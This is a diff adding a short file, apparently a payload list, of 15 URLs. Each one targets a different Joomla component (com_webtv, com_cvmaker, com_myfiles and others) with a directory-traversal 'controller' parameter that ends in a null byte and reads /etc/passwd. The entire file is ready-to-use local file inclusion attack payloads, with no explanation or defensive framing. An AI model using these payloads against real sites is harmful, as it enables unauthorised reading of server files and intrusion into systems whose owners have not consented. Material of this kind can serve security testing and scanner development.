@@ -1,0 +1,15 @@
+http://www.example.com/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_horoscope&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_arcadegames&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_flashgames&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_addressbook&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_advertising&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_cvmaker&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_myfiles&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_onlineexam&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_joommail&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_memory&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_market&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_diary&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_worldrates&controller=../../../../../../../../../../etc/passwd%00
+http://www.example.com/index.php?option=com_record&controller=../../../../../../../../../../etc/passwd%00
